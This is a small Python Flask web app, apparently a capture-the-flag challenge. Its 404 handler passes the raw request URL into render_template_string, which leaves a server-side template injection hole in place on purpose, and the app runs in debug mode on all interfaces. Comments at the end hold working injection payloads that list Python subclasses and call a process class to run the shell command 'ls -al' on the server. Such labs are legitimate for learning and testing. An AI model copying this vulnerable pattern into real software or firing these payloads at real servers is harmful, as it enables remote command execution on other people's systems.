from flask import Flask,request,render_template_string 
from urllib.parse import unquote

app = Flask(__name__)
flag = ''

@app.route("/")
def main_page():
    return "Hey there, this is my cool weeb site."

@app.errorhandler(404) 
def page_not_found(error): 
    url = unquote(request.url) 
    return render_template_string("<h1>URL %s not found</h1><br/>" % url), 404 


if __name__ == '__main__': 
    app.run(debug = True, host = '0.0.0.0')


#{{ ''.__class__.__mro__[1].__subclasses__() }}
#{{ ''.__class__.__mro__[1].__subclasses__()[236] }}
#{{''.__class__.__mro__[1].__subclasses__()[464]('ls -al',shell=True,stdout=-1).communicate()}}
